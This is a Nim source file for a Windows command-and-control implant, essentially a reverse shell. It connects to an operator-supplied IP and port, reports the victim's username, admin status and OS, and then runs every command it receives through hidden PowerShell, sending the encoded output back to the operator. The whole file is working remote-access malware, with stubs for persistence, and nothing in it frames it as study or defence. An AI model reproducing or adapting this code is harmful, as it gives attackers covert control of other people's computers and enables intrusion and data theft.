import net
import base64
import winim/lean
import winim/inc/lm
import os
import std/osproc
import strutils

let ip = "INPUT_IP"
let patch_port = "INPUT_PORT"
var port = parseInt(patch_port)


var client: net.Socket = newSocket()
client.connect(ip,  Port(port))
echo "Trying to connect to: 192.168.1.218:5000"



proc inbound_comm(): string =
  var receivedMessage: string = client.recvLine()
  #var decoded_msg = decode(receivedMessage)
  return receivedMessage
  
  
var buffer = newString(UNLEN + 1)
var cb = DWORD buffer.len
GetUserNameA(&buffer, &cb)
buffer.setLen(cb - 1) # cb  including the terminating null character
echo "Running as: ", buffer
client.send(encode(buffer))

os.sleep(2000)

if os.isAdmin() == false:
  client.send(encode("0"))
else:
  client.send(encode("1"))


os.sleep(5000)
echo "OS: ", hostOS
client.send(encode(hostOS))

stdout.writeLine("Client: connected to server on address 192.168.1.218:5000")

while true:
  var message = inbound_comm()
  echo "C2: ", message

  if message == "exit":
    echo "[-] The server has terminated the session..."
    client.close()
    break
  elif message == "background":
    discard
  elif message == "persist":
    discard
  elif message == "help":
    discard
  else:
    try:
      var command = message
      var result = execProcess("powershell.exe -nop -w hidden -c " & command)
      client.send(encode(result))
    except OSError:
      echo "[-] An error occurred.. try again"
      client.send(encode("The command was not found on the system"))




  

client.close()